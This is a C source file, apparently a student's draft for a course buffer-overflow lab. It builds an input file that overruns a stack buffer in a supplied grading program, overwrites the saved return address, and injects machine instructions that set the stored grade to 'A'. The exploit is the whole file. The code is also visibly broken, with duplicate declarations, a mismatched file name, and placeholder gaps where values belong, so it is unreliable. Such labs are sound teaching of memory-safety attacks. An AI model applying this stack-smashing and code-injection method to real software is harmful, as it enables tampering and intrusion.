/*--------------------------------------------------------------------*/
/* File: createdataA.c                                                */
/*                                                                    */
/* Function: Produces a file called dataA with the student name,      */
/* padding to overrun the stack, and a crafted instruction sequence   */
/* address. This address will overwrite getName's stored x30 and      */
/* redirect execution to a sequence that changes the grade to 'A'.    */
/*                                                                    */
/* Names: Alex Delistathis, Matthew Zhang                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *dataA ;
    fopen("dataA", "w+");

    /* create a file pointer and iterator variable */
   FILE *dataA;

   /* open the file */
   dataA = fopen("dataB", "w+");

   /* write names to file */ 
   fprintf(dataA, "Alex Delistathis & Matthew Zhang");

   /* write null byte to file */
   putc('\0', dataA);
   
   /* overrun the stack */
   fprintf(dataA, "%s", "angangangangang");

    /* Calculate the address where the payload will be loaded */
    unsigned int payloadAddress = /* payload address */;
    fwrite(&payloadAddress, sizeof(unsigned int), 1, dataA);

    /* Move 'A' into a register */
    unsigned int movInstr = MiniAssembler_mov(0, 65); 
    fwrite(&movInstr, sizeof(unsigned int), 1, dataA);

    /* Store 'A' into the grade variable */
    unsigned int strbInstr = MiniAssembler_strb(0, /* reg for 0x420044 */);
    fwrite(&strbInstr, sizeof(unsigned int), 1, dataA);

    /* Branch back to main function after getName */
    unsigned int bInstr = MiniAssembler_b(0x400878, /* current address*/);

    fwrite(&bInstr, sizeof(unsigned int), 1, dataA);

    fclose(dataA);
    return 0;
}
